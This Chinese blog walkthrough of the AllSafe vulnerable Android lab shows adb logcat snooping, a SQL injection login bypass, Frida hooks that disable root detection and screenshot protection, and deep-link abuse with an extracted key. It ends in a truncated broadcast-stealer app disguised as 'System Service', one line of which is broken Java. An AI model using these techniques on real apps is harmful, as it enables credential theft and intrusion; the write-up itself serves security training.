@@ -1,0 +1,900 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Gilgamesh">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="AllSafe https:&#x2F;&#x2F;github.com&#x2F;t0thkr1s&#x2F;allsafe-android  Insecure Logging有时候 logcat 中会直接输出明文的敏感信息内容 获取 app 进程 pid 1adb shell &#x27;pidof infosecadventures.allsafe&#x27;  监视目标进程的 logcat 1adb shell &#x27;lo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="allsafe WP">
+<meta property="og:url" content="http://example.com/2025/12/18/allsafe-WP/index.html">
+<meta property="og:site_name" content="APT114514">
+<meta property="og:description" content="AllSafe https:&#x2F;&#x2F;github.com&#x2F;t0thkr1s&#x2F;allsafe-android  Insecure Logging有时候 logcat 中会直接输出明文的敏感信息内容 获取 app 进程 pid 1adb shell &#x27;pidof infosecadventures.allsafe&#x27;  监视目标进程的 logcat 1adb shell &#x27;lo">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/I8MEb0BfHo65ToxsVf2cmEElnic.png">
+<meta property="og:image" content="http://example.com/img/FCw0bcx9Bo5adWxybQ1cuptynTe.png">
+<meta property="og:image" content="http://example.com/img/Sx1dbBWzaohO2HxYceQcwR6Cnxf.png">
+<meta property="og:image" content="http://example.com/img/WdQxb5t6gogSWFxHJETc09F5ntc.png">
+<meta property="og:image" content="http://example.com/img/GHA7beXtboPTKLximQ4ctNgxnYu.png">
+<meta property="og:image" content="http://example.com/img/T6iGbKqLsoTpQax97CZcyJYlnxc.png">
+<meta property="og:image" content="http://example.com/img/PO4Ub3gLqoAHPaxdArscNhvNnwc.png">
+<meta property="og:image" content="http://example.com/img/G1pJbrR37oUB1MxDebJcLhfXnkd.png">
+<meta property="og:image" content="http://example.com/img/MVd4baT4HoFj22xRI24cCoR2nVh.png">
+<meta property="og:image" content="http://example.com/img/Rq1rb7V1Horc6ZxSCkWcvgXVnid.png">
+<meta property="og:image" content="http://example.com/img/Pe0jbeH2Vo595XxG5bkcBK42n6n.png">
+<meta property="og:image" content="http://example.com/img/FzGYbcnY3oMPl2x7SY0cO803n9g.png">
+<meta property="og:image" content="http://example.com/img/Y9bKbHh8oo2PvvxoWDUcvygsnAh.png">
+<meta property="og:image" content="http://example.com/img/HPosbs1x7oG1uExq1TWcJqMUnGc.png">
+<meta property="og:image" content="http://example.com/img/BB3jbpcLooG7pIxL1vJcj1CvnwC.png">
+<meta property="og:image" content="http://example.com/img/EuiJbHqnuomudIx7VztcQe8Fnzb.png">
+<meta property="og:image" content="http://example.com/img/MeQCb5nsJoGuYexmqlactgcDnTf.png">
+<meta property="og:image" content="http://example.com/img/WPNYbKqlsovwzZxqdrOcH4ofn2d.png">
+<meta property="og:image" content="http://example.com/img/Q3aIbPSu9ouyQMxwmGCcvyHbnOb.png">
+<meta property="og:image" content="http://example.com/img/LaZibA6I5oBNqgxlzUZcWkCinyh.png">
+<meta property="og:image" content="http://example.com/img/Jn8Fb7ISno6omVx7oQwc8pssnLd.png">
+<meta property="og:image" content="http://example.com/img/NRaYbmyItoNrfdx6lZUcVAQwnRh.png">
+<meta property="og:image" content="http://example.com/img/CKa0bXKbfoYRXnxwyemcRTk2nuf.png">
+<meta property="og:image" content="http://example.com/img/W9Leb9YcCo2aJXxd1rncLe9Ynob.png">
+<meta property="og:image" content="http://example.com/img/RpvmbaWcKocupBxFe4EcW4D2nOd.png">
+<meta property="og:image" content="http://example.com/img/IvS8bqyFloAwhpxmA0gcOsianlh.png">
+<meta property="og:image" content="http://example.com/img/OyS7bNYFDoivuZxfE7KcIJbansb.png">
+<meta property="og:image" content="http://example.com/img/Vv0TbMUymodChXx3Y1AcDEnCn7e.png">
+<meta property="og:image" content="http://example.com/img/HViPbM5o7ofoQZxQqkAcxhjInch.png">
+<meta property="og:image" content="http://example.com/img/Q9mGbkCnboCEaYxgc41ck0a7nEf.png">
+<meta property="og:image" content="http://example.com/img/PD0ebT2g0oxjdJxX4C8cfxzInuh.png">
+<meta property="og:image" content="http://example.com/img/WpF7bCCjNoKHE9xF33Kcxae8nhg.png">
+<meta property="og:image" content="http://example.com/img/YMkvbZX5wozwNUxK7sic7dMSnQb.png">
+<meta property="og:image" content="http://example.com/img/MTCPbv7M8oeKuCxgRfAcpdW9nSh.png">
+<meta property="og:image" content="http://example.com/img/JtilbE35xoXmKFxCccscx33Kn7O.png">
+<meta property="og:image" content="http://example.com/img/CaLabOJFToPeNixiCckcmm3XnLd.png">
+<meta property="og:image" content="http://example.com/img/LWkgbYtTCoZ9eZxbKB1cM6hBn8I.png">
+<meta property="og:image" content="http://example.com/img/SFXAbhl5yoZyacxmbePcnKBon5e.png">
+<meta property="og:image" content="http://example.com/img/EOmEb0VkyoU6nUxdzqxc9zCungd.png">
+<meta property="og:image" content="http://example.com/img/TZiMbgd7moSYCXxLT2yc1POhnYc.png">
+<meta property="og:image" content="http://example.com/img/TFasbf7JHof4gkxNIMVca5eenog.png">
+<meta property="og:image" content="http://example.com/img/B1C1bbMUMoT7ujxpKUkcx5K0nma.png">
+<meta property="og:image" content="http://example.com/img/Nt3Tbqo6xoCOWIxVITHczOkNnuh.png">
+<meta property="og:image" content="http://example.com/img/MtPMbFDkHoz8o2xoc57cSwz3nrd.png">
+<meta property="og:image" content="http://example.com/img/He0Fb4KWeoFt7oxl3uKcbXddnvf.png">
+<meta property="og:image" content="http://example.com/img/DCNYbVBidogKk0xEUUjc1no6n8d.png">
+<meta property="og:image" content="http://example.com/img/NYRybgeRKog6omxBCLuctQVCnhc.png">
+<meta property="og:image" content="http://example.com/img/KiJPbWUo7o1iflx4NgKcD6fenJ6.png">
+<meta property="og:image" content="http://example.com/img/WEI3b0IAioGoBOx9ldMceTrmnmh.png">
+<meta property="og:image" content="http://example.com/img/X5pxbJq4JoaZMOxgrNPc08jBnFe.png">
+<meta property="og:image" content="http://example.com/img/NxDfbByLzo508IxpIdqcuDMNnRV.png">
+<meta property="og:image" content="http://example.com/img/M9hibfq29oVBBtxiTLjczJN0nob.png">
+<meta property="og:image" content="http://example.com/img/UjyxbEICxooMkqxFapzc5mnQnVb.png">
+<meta property="og:image" content="http://example.com/img/SauDbppqboa04AxbkubcFE3bnOf.png">
+<meta property="og:image" content="http://example.com/img/LsM4b9kQ1o84dRx44iHc0MOfnMg.png">
+<meta property="og:image" content="http://example.com/img/HldgbdQ2mocdW0xR4lKcrlnDnbe.png">
+<meta property="og:image" content="http://example.com/img/Eig4bOq4gotGwqxF7x3cEGsSnnh.png">
+<meta property="og:image" content="http://example.com/img/DqnZb7gh8opIXHx31WvcwnHin5k.png">
+<meta property="article:published_time" content="2025-12-17T16:12:32.000Z">
+<meta property="article:modified_time" content="2025-12-17T16:13:20.163Z">
+<meta property="article:author" content="Gilgamesh">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/I8MEb0BfHo65ToxsVf2cmEElnic.png">
+  
+  
+  
+  <title>allsafe WP - APT114514</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="allsafe WP"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-12-18 00:12" pubdate>
+          2025年12月18日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          26 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">allsafe WP</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="AllSafe"><a href="#AllSafe" class="headerlink" title="AllSafe"></a>AllSafe</h1><blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/t0thkr1s/allsafe-android">https://github.com/t0thkr1s/allsafe-android</a></p>
+</blockquote>
+<h1 id="Insecure-Logging"><a href="#Insecure-Logging" class="headerlink" title="Insecure Logging"></a>Insecure Logging</h1><p><strong>有时候 logcat 中会直接输出明文的敏感信息内容</strong></p>
+<p>获取 app 进程 pid</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">adb shell <span class="hljs-string">&#x27;pidof infosecadventures.allsafe&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>监视目标进程的 logcat</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">adb shell <span class="hljs-string">&#x27;logcat --pid [PID] | grep secret&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>直接可以打印出用户输入的明文密码</p>
+<p><img src="/img/I8MEb0BfHo65ToxsVf2cmEElnic.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="Hardcoded-Credentials"><a href="#Hardcoded-Credentials" class="headerlink" title="Hardcoded Credentials"></a>Hardcoded Credentials</h1><p>硬编码敏感信息</p>
+<p><img src="/img/FCw0bcx9Bo5adWxybQ1cuptynTe.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="Firebase-Database"><a href="#Firebase-Database" class="headerlink" title="Firebase Database"></a>Firebase Database</h1><p>反编译发现他会尝试去访问 firebase 的 secret 节点</p>
+<p><img src="/img/Sx1dbBWzaohO2HxYceQcwR6Cnxf.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以在 FirebaseOptions 类中看到配置的定义</p>
+<p><img src="/img/WdQxb5t6gogSWFxHJETc09F5ntc.png" srcset="/img/loading.gif" lazyload></p>
+<p>从 res 中读取配置文件</p>
+<p><img src="/img/GHA7beXtboPTKLximQ4ctNgxnYu.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="Insecure-Shared-Preferences"><a href="#Insecure-Shared-Preferences" class="headerlink" title="Insecure Shared Preferences"></a>Insecure Shared Preferences</h1><p>Shared Preferences 会在本地存储一些数据，比如缓存用户的账户密码</p>
+<p>输入一遍账户密码后</p>
+<p><img src="/img/T6iGbKqLsoTpQax97CZcyJYlnxc.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以在 app 的 data 目录下找到存储的用户信息</p>
+<p><img src="/img/PO4Ub3gLqoAHPaxdArscNhvNnwc.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h1><p>很多 app 本地会采用 Sqlite 作为数据库，存储用户信息，漏洞原理跟普通的 web 上的 sql 注入同理</p>
+<p><img src="/img/G1pJbrR37oUB1MxDebJcLhfXnkd.png" srcset="/img/loading.gif" lazyload></p>
+<p>user 表中还存储了其他用户的信息，可以直接注出来</p>
+<p><img src="/img/MVd4baT4HoFj22xRI24cCoR2nVh.png" srcset="/img/loading.gif" lazyload></p>
+<p>直接万能密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">1<span class="hljs-string">&#x27; or 1=1 --</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/Rq1rb7V1Horc6ZxSCkWcvgXVnid.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="PIN-Bypass"><a href="#PIN-Bypass" class="headerlink" title="PIN Bypass"></a>PIN Bypass</h1><p>直接反编译就能看到 PIN 码</p>
+<p><img src="/img/Pe0jbeH2Vo595XxG5bkcBK42n6n.png" srcset="/img/loading.gif" lazyload></p>
+<p>直接就解出来了</p>
+<p><img src="/img/FzGYbcnY3oMPl2x7SY0cO803n9g.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/Y9bKbHh8oo2PvvxoWDUcvygsnAh.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="Root-Detection"><a href="#Root-Detection" class="headerlink" title="Root Detection"></a>Root Detection</h1><p>很多 app 会检测 Root 环境</p>
+<p><img src="/img/HPosbs1x7oG1uExq1TWcJqMUnGc.png" srcset="/img/loading.gif" lazyload></p>
+<p>通过调用 <strong>RootBeer</strong> 类的 <strong>isRooted 方法检测</strong>是否 Root</p>
+<p><img src="/img/BB3jbpcLooG7pIxL1vJcj1CvnwC.png" srcset="/img/loading.gif" lazyload></p>
+<p>用 frida 特别容易绕过，直接让 <strong>isRooted 返回 false 即可</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br><span class="hljs-keyword">let</span> <span class="hljs-title class_">RootBeer</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.scottyab.rootbeer.RootBeer&quot;</span>);<br><span class="hljs-title class_">RootBeer</span>[<span class="hljs-string">&quot;isRooted&quot;</span>].<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`RootBeer.isRooted is called`</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;;<br>&#125;);<br></code></pre></td></tr></table></figure>
+
+<p>成功绕过检测</p>
+<p><img src="/img/EuiJbHqnuomudIx7VztcQe8Fnzb.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="Secure-Flag-Bypass"><a href="#Secure-Flag-Bypass" class="headerlink" title="Secure Flag Bypass"></a>Secure Flag Bypass</h1><p>当前应用不允许截图</p>
+<p><img src="/img/MeQCb5nsJoGuYexmqlactgcDnTf.png" srcset="/img/loading.gif" lazyload></p>
+<p>回到 MainActivity，可以看到其设置了 <strong>FLAG_SECURE</strong><strong>，默认值为 8192 ，所以导致我们不能截图</strong></p>
+<p><img src="/img/WPNYbKqlsovwzZxqdrOcH4ofn2d.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/Q3aIbPSu9ouyQMxwmGCcvyHbnOb.png" srcset="/img/loading.gif" lazyload></p>
+<p>只是代码层面的防护，直接 hook 掉就行了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">Java.perform(<span class="hljs-function"><span class="hljs-title">function</span></span> () &#123;<br><span class="hljs-built_in">let</span> Window  = Java.use(<span class="hljs-string">&quot;android.view.Window&quot;</span>);<br>Window[<span class="hljs-string">&quot;setFlags&quot;</span>].implementation = <span class="hljs-function"><span class="hljs-title">function</span></span> () &#123;<br>    console.log(`setFlags.isRooted is called`);<br>    <span class="hljs-built_in">return</span> this.setFlags(1, 1);<br>    &#125;;<br>&#125;);<br></code></pre></td></tr></table></figure>
+
+<p>成功截图</p>
+<p><img src="/img/LaZibA6I5oBNqgxlzUZcWkCinyh.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="Deep-Link-Exploitation"><a href="#Deep-Link-Exploitation" class="headerlink" title="Deep Link Exploitation"></a>Deep Link Exploitation</h1><p>查看 manifest 文件，定义了两个 deeplink：</p>
+<p><img src="/img/Jn8Fb7ISno6omVx7oQwc8pssnLd.png" srcset="/img/loading.gif" lazyload></p>
+<p>从 Intent 的 Uri 中获取 <code>key</code> 参数，判断其是否等于 <code>R.string.key</code></p>
+<p><img src="/img/NRaYbmyItoNrfdx6lZUcVAQwnRh.png" srcset="/img/loading.gif" lazyload></p>
+<p>在 <strong>res&#x2F;values&#x2F;strings.xml</strong> 中查找 key 的值为 <code>ebfb7ff0-b2f6-41c8-bef3-4fba17be410c</code></p>
+<p><img src="/img/CKa0bXKbfoYRXnxwyemcRTk2nuf.png" srcset="/img/loading.gif" lazyload></p>
+<p>因为定义了 <code>intent-filter</code> 使用 adb 隐式 Intent 启动该 activity</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">adb shell am start -a android.intent.action.VIEW -d <span class="hljs-string">&quot;allsafe://infosecadventures/congrats?key=ebfb7ff0-b2f6-41c8-bef3-4fba17be410c&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/W9Leb9YcCo2aJXxd1rncLe9Ynob.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="Insecure-Broadcast-Receiver"><a href="#Insecure-Broadcast-Receiver" class="headerlink" title="Insecure Broadcast Receiver"></a>Insecure Broadcast Receiver</h1><p>用户输入一段文本后，点击 “Save” 按钮后，创建一个 隐式 Intent，Action 为 <code>&quot;infosecadventures.allsafe.action.PROCESS_NOTE&quot;</code></p>
+<p><img src="/img/RpvmbaWcKocupBxFe4EcW4D2nOd.png" srcset="/img/loading.gif" lazyload></p>
+<p>因为 Android8 之后的版本广播接收器接收不到隐式 Intent 发送的广播，所以他这里采用了 <code>PackageManager</code> 遍历系统中所有的广播接收器</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">PackageManager</span> <span class="hljs-variable">packageManager</span> <span class="hljs-operator">=</span> requireActivity().getPackageManager();<br>List&lt;ResolveInfo&gt; resolveInfos = packageManager.queryBroadcastReceivers(intent, <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure>
+
+<p><code>queryBroadcastReceivers(intent, 0)</code> 会返回一个 <code>List&lt;ResolveInfo&gt;</code>，里面包含了匹配该 Intent 的接收器的详细信息（包名、类名等）。然后代码遍历这个列表，<code>intent.setComponent(cn)</code> 对每个接收器 构造显式 Intent 并发送广播</p>
+<p>写一个监听器，专门监听 <code>infosecadventures.allsafe.action.PROCESS_NOTE</code></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">manifest</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">package</span>=<span class="hljs-string">&quot;com.example.stealer&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">application</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:allowBackup</span>=<span class="hljs-string">&quot;true&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:label</span>=<span class="hljs-string">&quot;System Service&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:theme</span>=<span class="hljs-string">&quot;@style/Theme.AppCompat.Light.NoActionBar&quot;</span>&gt;</span><br>        <br>        <span class="hljs-tag">&lt;<span class="hljs-name">activity</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;.MainActivity&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:exported</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">category</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">activity</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">receiver</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;.StealerReceiver&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:exported</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;infosecadventures.allsafe.action.PROCESS_NOTE&quot;</span> /&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">receiver</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">application</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">manifest</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.stealer;<br><br><span class="hljs-keyword">import</span> android.content.BroadcastReceiver;<br><span class="hljs-keyword">import</span> android.content.Context;<br><span class="hljs-keyword">import</span> android.content.Intent;<br><span class="hljs-keyword">import</span> android.util.Log;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StealerReceiver</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BroadcastReceiver</span> &#123;<br>    <span class="hljs-keyword">private</span> img <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TAG</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;STEALER&quot;</span>;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onReceive</span><span class="hljs-params">(Context context, Intent intent)</span> &#123;<br>        <span class="hljs-comment">// 检查是否是目标广播</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;infosecadventures.allsafe.action.PROCESS_NOTE&quot;</span>.equals(intent.getAction())) &#123;<br>            <br>            <span class="hljs-comment">// 提取并打印所有数据</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">server</span> <span class="hljs-operator">=</span> intent.getStringExtra(<span class="hljs-string">&quot;server&quot;</span>);<br>            <span 